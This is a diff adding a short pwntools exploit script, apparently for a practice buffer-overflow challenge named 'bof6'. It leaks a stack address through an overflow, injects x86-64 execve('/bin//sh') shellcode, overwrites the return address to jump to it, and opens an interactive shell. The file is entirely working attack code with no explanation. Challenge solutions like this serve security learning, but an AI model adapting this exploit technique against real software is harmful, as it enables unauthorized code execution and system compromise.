@@ -1,0 +1,23 @@
+from pwn import *
+
+p = process("./bof6")
+
+input()
+
+payload = b'A' * (0x50 - 1) + b'B'
+p.sendlineafter(b'>', b"1")
+p.sendafter(b'> ', payload)
+p.recvuntil(payload)
+stack_addr = u64(p.recvn(6)+ b'\x00' * 2)
+
+payload = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
+payload = payload.ljust(0x200, b'\x00')
+payload += b'B' * 0x8 + p64(stack_addr - 0x220)
+
+print(hex(stack_addr))
+print(payload)
+
+p.sendlineafter(b'> ', b"2")
+p.sendafter(b'> ', payload)
+
+p.interactive()
